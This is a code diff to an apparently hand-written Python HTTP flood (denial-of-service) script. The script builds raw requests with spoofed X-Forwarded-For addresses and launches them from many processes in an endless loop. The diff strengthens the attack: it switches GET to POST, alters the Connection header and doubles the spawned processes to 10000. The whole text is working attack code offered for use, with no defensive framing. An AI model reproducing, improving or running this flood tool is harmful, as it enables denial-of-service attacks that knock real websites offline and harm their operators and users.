@@ -25,10 +25,10 @@ def randomip():
 
 
 def attack():
-  connection = "Connection: keep-alive\r\n"
+  connection = "Connection: null\r\n"
   referer = "Referer: null\r\n"
   forward = "X-Forwarded-For: " + randomip() + "\r\n"
-  get_host = "GET " + url + " HTTP/1.1\r\nHost: " + ip + "\r\n"
+  get_host = "POST " + url + " HTTP/1.1\r\nHost: " + ip + "\r\n"
   request = get_host + referer  + connection + forward + "\r\n\r\n"
   while True:
     try:
@@ -50,7 +50,7 @@ print("[>>>] Starting the attack [<<<]")
 sleep(1)
 
 def send2attack():
-  for i in range(5000): #Magic Power
+  for i in range(10000): #Magic Power
     mp = multiprocessing.Process(target=attack)
     mp.setDaemon = False
     mp.start() #Magic Starts
